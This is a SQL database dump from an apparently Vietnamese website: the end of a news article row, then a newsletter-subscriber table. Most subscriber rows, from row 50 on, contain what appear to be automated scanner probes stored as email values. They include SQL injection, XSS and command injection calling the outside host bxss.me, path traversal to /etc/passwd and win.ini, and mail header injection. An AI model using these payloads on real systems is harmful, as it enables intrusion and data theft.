v&agrave; c&oacute; nguồn gốc thi&ecirc;n nhi&ecirc;n cũng mang lại thiện cảm cao nhất cho người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Hi vọng những tư vấn tr&ecirc;n đ&acirc;y sẽ gi&uacute;p kh&aacute;ch h&agrave;ng t&igrave;m chọn được xu hướng thiết kế bao b&igrave; thực phẩm ph&ugrave; hợp nhất m&agrave; doanh nghiệp bạn đang cần..</span></p>', NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 0, '2018-10-17 13:25:21', '2018-10-17 06:25:21');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `newsletter`
--

CREATE TABLE `newsletter` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) DEFAULT '0',
  `name` text COLLATE utf8_unicode_ci,
  `link` text COLLATE utf8_unicode_ci,
  `email` text COLLATE utf8_unicode_ci,
  `phone` text COLLATE utf8_unicode_ci,
  `photo` text COLLATE utf8_unicode_ci,
  `mota` longtext COLLATE utf8_unicode_ci,
  `content` longtext COLLATE utf8_unicode_ci,
  `status` int(11) NOT NULL DEFAULT '1',
  `noibat` int(11) NOT NULL DEFAULT '0',
  `com` text COLLATE utf8_unicode_ci,
  `stt` int(11) NOT NULL DEFAULT '0',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `newsletter`
--

INSERT INTO `newsletter` (`id`, `user_id`, `name`, `link`, `email`, `phone`, `photo`, `mota`, `content`, `status`, `noibat`, `com`, `stt`, `created_at`, `updated_at`) VALUES
(47, 0, NULL, NULL, 'abc@gmail.com', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-04-25 21:39:27', '2018-04-25 21:39:27'),
(46, 0, NULL, NULL, 'c@gmail.com', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2017-12-21 23:47:00', '2017-12-21 23:47:00'),
(48, 0, NULL, NULL, 'jc.thaison@gmail.com', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-06-15 06:29:58', '2018-06-15 06:29:58'),
(49, 0, NULL, NULL, 'sample@email.tst', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:10:02', '2018-07-03 04:10:02'),
(50, 0, NULL, NULL, 'response.write(9300761*9272528)', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:25', '2018-07-03 04:35:25'),
(51, 0, NULL, NULL, 'sample%40email.tst', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:25', '2018-07-03 04:35:25'),
(52, 0, NULL, NULL, '\'+response.write(9300761*9272528)+\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:26', '2018-07-03 04:35:26'),
(53, 0, NULL, NULL, '\"+response.write(9300761*9272528)+\"', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:26', '2018-07-03 04:35:26'),
(54, 0, NULL, NULL, '-1 OR 2+784-784-1=0+0+0+1 --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:27', '2018-07-03 04:35:27'),
(55, 0, NULL, NULL, '-1 OR 2+573-573-1=0+0+0+1', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:28', '2018-07-03 04:35:28'),
(56, 0, NULL, NULL, '-1\' OR 2+291-291-1=0+0+0+1 --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:28', '2018-07-03 04:35:28'),
(57, 0, NULL, NULL, '-1\' OR 2+579-579-1=0+0+0+1 or \'Jq2o187Q\'=\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:29', '2018-07-03 04:35:29'),
(58, 0, NULL, NULL, 'sample%40email.tst</script><svg/onload=\'+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.src=(/,/+/bxss.me\\/s?u=043737&r=53-450&h=53-213ac-2&/).slice(2),document.documentElement.appendChild(s))//\'>', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:30', '2018-07-03 04:35:30'),
(59, 0, NULL, NULL, '-1\" OR 2+883-883-1=0+0+0+1 --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:30', '2018-07-03 04:35:30'),
(60, 0, NULL, NULL, 'sample%40email.tst\'>\"><script src=http://bxss.me/s?u=043737&r=53-451&h=53-213ac-1></script><tcpdf method=\"addTTFFont\" params=\"%5B%22%5C%2Fetc%5C%2Fhosts%22%2C%22TrueType%22%2C%22%22%2C255%2C%22ftp%3A%5C%2F%5C%2Fftpadmin%3AzaNEgbe8XcCb%40bxss.me%3A999%5C%2Fbxss,043737,53-451,53,213ac,%22%5D\"/>', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:30', '2018-07-03 04:35:30'),
(61, 0, NULL, NULL, 'if(now()=sysdate(),sleep(6),0)/*\'XOR(if(now()=sysdate(),sleep(6),0))OR\'\"XOR(if(now()=sysdate(),sleep(6),0))OR\"*/', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:30', '2018-07-03 04:35:30'),
(62, 0, NULL, NULL, '(select(0)from(select(sleep(9)))v)/*\'+(select(0)from(select(sleep(9)))v)+\'\"+(select(0)from(select(sleep(9)))v)+\"*/', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:31', '2018-07-03 04:35:31'),
(63, 0, NULL, NULL, '1 waitfor delay \'0:0:9\' --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:32', '2018-07-03 04:35:32'),
(64, 0, NULL, NULL, 'set|set&set', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:33', '2018-07-03 04:35:33'),
(65, 0, NULL, NULL, 'RGDLggZS\'; waitfor delay \'0:0:9\' --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:33', '2018-07-03 04:35:33'),
(66, 0, NULL, NULL, 'vh4CvoKd', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:33', '2018-07-03 04:35:33'),
(67, 0, NULL, NULL, '2uQQ7xN2\';select pg_sleep(9); --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:34', '2018-07-03 04:35:34'),
(68, 0, NULL, NULL, '0pv6kddT\');select pg_sleep(9); --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:34', '2018-07-03 04:35:34'),
(69, 0, NULL, NULL, '$(nslookup dns.ce.\\043737.53-454.53.213ac.\\1.bxss.me)', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:35', '2018-07-03 04:35:35'),
(70, 0, NULL, NULL, 'nu5EQXS8\'));select pg_sleep(9); --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:35', '2018-07-03 04:35:35'),
(71, 0, NULL, NULL, '../../../../../../../../../../etc/passwd', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:35', '2018-07-03 04:35:35'),
(72, 0, NULL, NULL, '&nslookup dns.ce.\\043737.53-455.53.213ac.\\1.bxss.me&\'\\\"`0&nslookup dns.ce.\\043737.53-455.53.213ac.\\1.bxss.me&`\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:36', '2018-07-03 04:35:36'),
(73, 0, NULL, NULL, '\'||UTL_INADDR.get_host_address(\'dns.\'||\'sqli.043737.53-456.53.213ac.1.bxss\'||\'.me\')||\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:36', '2018-07-03 04:35:36'),
(74, 0, NULL, NULL, '../../../../../../../../../../../../../../../proc/version', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:36', '2018-07-03 04:35:36'),
(75, 0, NULL, NULL, 'sample%40email.tst\';copy (select \'\') to program \'nslookup dns.sqli.\\043737.53-457.53.213ac.\\1.bxss.me', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:37', '2018-07-03 04:35:37'),
(76, 0, NULL, NULL, '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.tst', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:37', '2018-07-03 04:35:37'),
(77, 0, NULL, NULL, '80\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:37', '2018-07-03 04:35:37'),
(78, 0, NULL, NULL, '../../../../../../../../../../etc/passwd\0.tst', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:38', '2018-07-03 04:35:38'),
(79, 0, NULL, NULL, 'sample@email.tst\nbcc:043737.53-460.53.213ac.1@bxss.me', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:39', '2018-07-03 04:35:39'),
(80, 0, NULL, NULL, '/../..//../..//../..//../..//../..//etc/passwd\0.tst', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:39', '2018-07-03 04:35:39'),
(81, 0, NULL, NULL, 'to@example.com>\r\nbcc:043737.53-461.53.213ac.1@bxss.me', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:39', '2018-07-03 04:35:39'),
(82, 0, NULL, NULL, '.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:40', '2018-07-03 04:35:40'),
(83, 0, NULL, NULL, '/etc/passwd', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:40', '2018-07-03 04:35:40'),
(84, 0, NULL, NULL, '%2fetc%2fpasswd', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:41', '2018-07-03 04:35:41'),
(85, 0, NULL, NULL, '/.././.././.././.././.././.././.././../etc/./passwd%00', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:42', '2018-07-03 04:35:42'),
(86, 0, NULL, NULL, '../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:43', '2018-07-03 04:35:43'),
(87, 0, NULL, NULL, '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:43', '2018-07-03 04:35:43'),
(88, 0, NULL, NULL, 'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:45', '2018-07-03 04:35:45'),
(89, 0, NULL, NULL, 'file:///etc/passwd', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:48', '2018-07-03 04:35:48'),
(90, 0, NULL, NULL, '/\\../\\../\\../\\../\\../\\../\\../etc/passwd', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:49', '2018-07-03 04:35:49'),
(91, 0, NULL, NULL, 'WEB-INF/web.xml', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:50', '2018-07-03 04:35:50'),
(92, 0, NULL, NULL, '${9999103+10000282}', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:50', '2018-07-03 04:35:50'),
(93, 0, NULL, NULL, '/WEB-INF/web.xml', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:51', '2018-07-03 04:35:51'),
(94, 0, NULL, NULL, 'WEB-INF\\web.xml', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:51', '2018-07-03 04:35:51'),
(95, 0, NULL, NULL, 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.tst', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:52', '2018-07-03 04:35:52'),
(96, 0, NULL, NULL, '../../../../../../../../../../windows/win.ini', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:52', '2018-07-03 04:35:52'),
(97, 0, NULL, NULL, '1some_inexistent_file_with_long_name\0.tst', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:53', '2018-07-03 04:35:53'),
(98, 0, NULL, NULL, 'C:\\WINDOWS\\system32\\drivers\\etc\\hosts', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:53', '2018-07-03 04:35:53'),
(99, 0, NULL, NULL, 'Http://testasp.vulnweb.com/t/fit.txt', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:53', '2018-07-03 04:35:53'),
(100, 0, NULL, NULL, '../../../../../../../../../../windows/win.ini\0.tst', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:53', '2018-07-03 04:35:53'),
(101, 0, NULL, NULL, 'http://testasp.vulnweb.com/t/fit.txt?.tst', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:54', '2018-07-03 04:35:54'),
(102, 0, NULL, NULL, 'testasp.vulnweb.com', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:55', '2018-07-03 04:35:55'),
(103, 0, NULL, NULL, '................windowswin.ini', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:55', '2018-07-03 04:35:55'),
(104, 0, NULL, NULL, '..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:56', '2018-07-03 04:35:56'),
(105, 0, NULL, NULL, '/.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./windows/win.ini', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:56', '2018-07-03 04:35:56'),
(106, 0, NULL, NULL, '../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:57', '2018-07-03 04:35:57'),
(107, 0, NULL, NULL, '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:58', '2018-07-03 04:35:58'),
(108, 0, NULL, NULL, 'unexisting/../../../../../../../../../../windows/win.ini.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:35:59', '2018-07-03 04:35:59'),
(109, 0, NULL, NULL, 'sample@email.tst&n958345=v928942', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:03', '2018-07-03 04:36:03'),
